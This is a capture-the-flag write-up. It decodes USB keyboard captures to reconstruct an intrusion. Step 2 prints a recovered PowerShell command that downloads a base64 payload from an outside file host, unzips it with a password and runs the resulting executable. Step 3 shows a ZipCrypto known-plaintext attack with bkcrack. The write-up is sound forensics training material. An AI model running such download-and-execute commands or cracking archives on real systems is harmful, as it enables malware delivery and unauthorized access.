CHALLENGE
---------
"We're an automotive security startup. Last night, our garage was breached...
 We managed to capture some logs via our first-ever agent. Can you analyze them
 and find out what was taken?"

Handout:
  PbWE.txt   (66 KB, base64 text)
  chall.zip  (42 MB) -> monitor_hardware (116 MB), monitor_network (75 KB)


KEY INSIGHTS
------------
1. The two "logs" are PCAP files, not text:
     monitor_hardware -> libpcap, link-layer type 249 = USBPcap (USB capture)
     monitor_network  -> libpcap, link-layer type 1   = Ethernet (HTTP exfil)
2. Title "What did you type" = decode USB HID keyboard scancodes.
3. The decoded keystrokes contain the ZIP password for the handout PbWE.txt.
4. PbWE.txt = base64 -> ZipCrypto zip -> module.exe (the attacker's agent).
5. module.exe steals Cool_Story.docx and uploads it to the C2; the flag is in
   that stolen document.


STEP 1 - TRIAGE
---------------
  chall.zip is a normal (unencrypted) zip with monitor_hardware + monitor_network.
  Magic bytes d4 c3 b2 a1 = little-endian libpcap.
  Bytes [20:24]:  monitor_hardware = 249 (USBPCAP),  monitor_network = 1 (ETHERNET).


STEP 2 - DECODE THE KEYSTROKES  (monitor_hardware)
--------------------------------------------------
  USBPcap record = 16-byte pcap rec hdr + USBPcap pkt hdr (offsets below) + data:
     [21] endpoint  (0x80 bit = IN)
     [22] transfer  (1 = INTERRUPT)
     [23] dataLength(u32)
  A boot USB keyboard sends 8-byte HID reports on interrupt-IN:
     [modifier][reserved][k1..k6]   modifier & 0x22 = Shift.
  Track key-DOWN transitions, map usage IDs via the HID usage table.

  Run:  python decode_hid.py
  Output (449 reports decoded from 61760 packets):

     powershell
     ls
     cd Documents
     ls
     [IO.File]::WriteAllBytes("$pwd\sus.zip",
        [Convert]::FromBase64String((irm 'https://0x0.st/PbWE.txt')))
     ls
     unzip
     unzip -P 1m_g0d_!! sus.zip -d out
     mv out\* .
     ./module.exe
     rm *
     exit

  (Raw decode shows [LEFT]/[RIGHT] = arrow keys 0x50/0x4f and TAB autocomplete;
   read through the cursor moves to get the commands above.)

  >>> RECOVERED ZIP PASSWORD:  1m_g0d_!!


STEP 3 - UNLOCK THE AGENT  (PbWE.txt -> module.exe)
---------------------------------------------------
  PbWE.txt is base64 ("UEsDBBQ" -> "PK\x03\x04").
     base64 -d PbWE.txt > PbWE.zip
  PbWE.zip uses legacy ZipCrypto (general-purpose flag bit0 = 1).
  Two routes:
    (a) Intended : extract with the typed password 1m_g0d_!!
          python -c "import zipfile;zipfile.ZipFile('PbWE.zip').extractall('m',pwd=b'1m_g0d_!!')"
    (b) Fallback : ZipCrypto known-plaintext (plaintext is a PE: MZ/PE header)
          bkcrack -C PbWE.zip -c module.exe -p mz_pe_prefix.bin
  Result: module.exe, 74240-byte native PE (WININET, VCRUNTIME140).
